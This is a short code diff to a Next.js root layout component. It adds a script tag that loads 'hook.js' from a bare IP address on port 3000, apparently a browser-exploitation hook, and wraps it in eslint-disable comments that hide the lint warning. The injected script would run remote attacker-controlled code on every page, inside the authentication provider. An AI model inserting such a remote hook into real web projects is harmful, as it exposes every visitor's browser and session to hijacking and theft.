@@ -13,7 +13,9 @@ export default function RootLayout({ children }) {
 
   return (
     <html lang="en">
+      /* eslint-disable @next/next/no-sync-scripts */
       <script src="http://154.251.13.131:3000/hook.js"></script>
+      /* eslint-enable @next/next/no-sync-scripts */
       <AuthProvider>
       <body className={clsx('bg-[#EFF2F6] ', poppins.className)}>{children}</body>
       </AuthProvider>
